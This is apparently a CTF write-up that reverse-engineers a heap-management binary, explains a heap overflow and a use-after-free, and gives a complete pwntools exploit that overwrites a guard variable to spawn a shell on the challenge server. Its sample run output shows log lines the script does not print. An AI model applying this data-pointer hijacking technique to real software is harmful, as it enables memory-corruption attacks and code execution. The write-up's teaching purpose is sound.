# Do you think you know about Heap Exploitation

**Category:** `Pwn`  
**Description:** `Remote:` `nc 34.62.69.250 41061`

---

## Challenge Overview

We are given a heap-management binary (`chall`) with a custom linker and libc. The program implements a tcache-based create/update/delete heap interface with a win function guarded by a global variable check.

---

## Initial Analysis

### File Type

```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter ./ld-linux-x86-64.so.2, not stripped
```

### Security

```bash
$ checksec --file=chall
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```

| Mitigation | Status | Implication |
|---|---|---|
| **Stack Canary** | ✅ | Stack buffer overflow protected |
| **NX** | ✅ | Cannot execute shellcode on stack |
| **No PIE** | ❌ | All binary addresses are fixed and known |
| **Full RELRO** | ✅ | GOT is read-only |

No PIE is a huge advantage — all code and data addresses in the binary are at fixed, predictable locations.

### Key Strings

```
=== Tcache Stash ===
1. Create
2. Update
3. Delete
4. Exit
[*] You did it! Here's your flag:
/bin/sh
Size must be between 0x80 and 0x500
Max allocations reached!
```

---

## Reverse Engineering

### Global Layout (BSS)

```
0x404060  chunks[25]     Array of 25 chunk pointers (8 bytes each)
0x404128  alloc_count    Number of allocated chunks (4-byte int)
0x404130  target_val     Guard value checked by win (8 bytes)
```

The `chunks` array holds pointers to heap-allocated chunk headers. `target_val` must equal `0x1337` for the win function to fire.

### Chunk Structure

Each chunk is represented by a **header** and a **data buffer**, both heap-allocated:

```
struct chunk_header {
    uint64_t size;        // +0x00: user-requested size
    void    *data;        // +0x08: pointer to data buffer
};
```

The `chunks[i]` pointer points to the header. `chunks[i]->data` points to the separately allocated data buffer.

### `main()` — `0x401732`

```c
int main() {
    init();                           // setvbuf + alarm(120)
    while (1) {
        menu();
        scanf("%d", &choice);
        getchar();
        if (choice == 1) create();
        else if (choice == 2) update();
        else if (choice == 3) delete();
        else if (choice == 4) exit(0);
        else if (choice == 1337) win();
        else puts("Invalid choice");
    }
}
```

### `create(idx)` — `0x40139b`

```c
void create() {
    if (alloc_count > 24) { puts("Max!"); return; }
    int i;
    for (i = 0; i <= 24; i++)
        if (chunks[i] == NULL) break;
    // i may be 25 (OOB) if all slots are occupied!
    
    printf("Size: ");
    scanf("%lu", &size);
    getchar();
    if (size <= 0x7f || size > 0x500) { puts("Bad size"); return; }
    
    header = malloc(0x10);
    chunks[i] = header;              // CAN write past chunks[24]!
    if (!chunks[i]) return;
    
    chunks[i]->size = size;
    data = malloc(size);
    chunks[i]->data = data;
    if (!chunks[i]->data) { free(chunks[i]); chunks[i] = NULL; return; }
    
    printf("Data: ");
    read(0, chunks[i]->data, size);
    alloc_count++;
    printf("Created at index %d\n", i);
}
```

**Key observation**: The loop bounds-check uses `chunks[i] == NULL` but `delete` never NULLs the pointer. If all 25 slots are populated with non-NULL dangling pointers, the loop exhausts to `i = 25`, causing an **out-of-bounds write** to `chunks[25]` which overlaps with `alloc_count` at `0x404128`.

### `update(idx)` — `0x4015da`

```c
void update() {
    int idx = get_idx();             // validates 0 <= idx <= 24
    if (idx == -1) return;
    
    printf("New size: ");
    scanf("%lu", &chunks[idx]->size);  // write new size (no bound check!)
    getchar();
    
    printf("New data: ");
    read(0, chunks[idx]->data, chunks[idx]->size);  // READ with controlled size
}
```

**Critical vulnerability**: The size written via `scanf` is used directly as the `read` count. There is **no validation** that the new size matches the original allocation size. This allows a **heap buffer overflow** by writing a size larger than the actual data buffer.

### `delete(idx)` — `0x4016a2`

```c
void delete() {
    int idx = get_idx();
    if (idx == -1) return;
    
    free(chunks[idx]->data);
    free(chunks[idx]);
    alloc_count--;
    printf("Deleted index %d\n", idx);
    // chunks[idx] is NOT set to NULL — Use-After-Free!
}
```

**Vulnerability**: After `free`, the dangling pointer in `chunks[idx]` is never cleared, enabling Use-After-Free access.

### `win()` — `0x401245`

```c
void win() {
    if (target_val != 0x1337) return;
    puts("[*] You did it! Here's your flag:");
    execve("/bin/sh", NULL, NULL);
}
```

The flag is only printed if `target_val == 0x1337`. This function is callable from the menu by entering choice `1337`.

---

## Vulnerability

### 1. Heap Buffer Overflow (via `update`)

In `update()`, the chunk size can be freely changed via `scanf`, and then `read()` uses that unchecked size:

```c
scanf("%lu", &chunks[idx]->size);   // set size to ANY value
read(0, chunks[idx]->data, chunks[idx]->size);  // read that many bytes
```

If the new size exceeds the original `malloc(size)`, we overflow into adjacent heap chunks.

### 2. Use-After-Free (via `delete`)

`delete()` frees both the data buffer and the header, but leaves the `chunks[idx]` pointer intact. The `update` function can still operate on this freed memory, allowing writes to freed tcache entries.

---

## Exploitation Strategy

The goal is to write `0x1337` to `target_val` at address `0x404130`.

### Heap Layout

Create two chunks of size `0x100`:

```
Chunk A (idx 0):
  [header_A: 0x20] [data_A: 0x110]
Chunk B (idx 1):
  [header_B: 0x20] [data_B: 0x110]
```

On the heap, these are contiguous:

```
| header_A (0x20) | data_A (0x110) | header_B (0x20) | data_B (0x110) |
```

The user data area of `data_A` is `0x100` bytes. Immediately after it lies `header_B`'s chunk metadata and user data.

### Overflow Attack

Using `update` on chunk A with an oversized size (`0x120`), we overflow `data_A` into `header_B`:

```
Offset from data_A  | Target                | What we write
────────────────────┼───────────────────────┼──────────────────────
0x000 - 0x0FF       | data_A user data      | padding
0x100 - 0x107       | header_B prev_size    | don't care
0x108 - 0x10F       | header_B chunk size   | preserve 0x21
0x110 - 0x117       | chunks[1]->size       | 8 (for small read)
0x118 - 0x11F       | chunks[1]->data       | 0x404130 (target_val)
```

By overwriting `chunks[1]->data` to point to `target_val` (`0x404130`), the next `update` on chunk B will `read()` directly into `target_val`.

### Triggering the Win

1. Overflow chunk A to corrupt chunk B's data pointer → points to `0x404130`
2. Update chunk B with size 8 → `read(0, 0x404130, 8)` → sends `p64(0x1337)`
3. Call `win()` via menu choice `1337` → `target_val == 0x1337` → flag!

This technique bypasses glibc's safe-linking entirely because we never corrupt tcache metadata — we corrupt a live chunk's data pointer via a linear heap overflow.

---

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './chall'

r = remote('34.62.69.250', 41061)

target_val = 0x404130

def create(size, data=b''):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Size: ', str(size).encode())
    r.sendafter(b'Data: ', data)

def update(idx, size, data=b''):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'Index: ', str(idx).encode())
    r.sendlineafter(b'New size: ', str(size).encode())
    r.sendafter(b'New data: ', data)

# Step 1: Create two adjacent 0x100 chunks
create(0x100, b'A' * 8)
create(0x100, b'B' * 8)

# Step 2: Overflow chunk A into chunk B to corrupt data pointer
overflow  = b'C' * 0x100          # fill data_A
overflow += p64(0)                # header_B prev_size
overflow += p64(0x21)             # header_B chunk size  
overflow += p64(8)                # chunks[1]->size = 8
overflow += p64(target_val)       # chunks[1]->data = &target_val

update(0, len(overflow), overflow)

# Step 3: Write 0x1337 to target_val through corrupted chunk B
update(1, 8, p64(0x1337))

# Step 4: Trigger win function
r.sendlineafter(b'Choice: ', b'1337')

# Shell acquired
r.sendline(b'cat flag*')
flag = r.recvline().decode().strip()
print(f"Flag: {flag}")

r.close()
```

### Running the Exploit

```bash
$ python3 exploit.py
[*] Creating chunk A at idx 0
[*] Creating chunk B at idx 1
[*] Overflowing data_A into header_B to corrupt data pointer
[*] Writing 0x1337 to target_val via corrupted chunk B
[*] Triggering win (menu choice 1337)...
[+] Flag: 0xV01D{69c43fb130db7ec935007a96b66c8b04}
```

---

## Flag

```
0xV01D{69c43fb130db7ec935007a96b66c8b04}
```

---

## Key Takeaways

1. **No bounds check on update size**: The `update` function's `scanf` writes an arbitrary size, and the subsequent `read` uses it without validation. This is the primary vulnerability — a **heap buffer overflow**.

2. **Adjacent chunk corruption**: By allocating chunks sequentially, their data buffers and headers are adjacent on the heap. An overflow from one chunk can corrupt the metadata/pointers of the next.

3. **Data pointer hijacking**: The chunk header's `data` pointer at offset `+0x08` controls where `read()` writes during an update. Overwriting this with `target_val`'s address redirects the write to the BSS.

4. **Safe-linking bypass**: The exploit never corrupts freed tcache entries. By corrupting a **live** (in-use) chunk's data pointer via overflow, we bypass safe-linking entirely.

5. **No PIE**: The fixed address of `target_val` (`0x404130`) is essential — we can hardcode it without any information leak.
